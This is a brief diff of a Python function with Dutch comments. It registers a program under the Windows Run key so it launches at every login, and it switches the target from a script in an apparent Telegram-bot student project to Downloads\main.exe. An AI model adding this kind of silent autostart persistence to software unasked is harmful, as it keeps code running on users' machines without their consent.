@@ -116,7 +116,7 @@ def add_to_registry(program_name):
         registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
 
         # Voeg een nieuwe registerwaarde toe
-        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, rf"C:\Users\{os.getlogin()}\Downloads\Minor-AD-CS-blok-3\pythonTelegramBot\main.py")
+        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, rf"C:\Users\{os.getlogin()}\Downloads\main.exe")
 
         print(f"{program_name} is toegevoegd aan de opstart-items")
 
@@ -125,4 +125,3 @@ def add_to_registry(program_name):
 
     except Exception as e:
         print(f"Fout bij toevoegen aan het register: {e}")
-
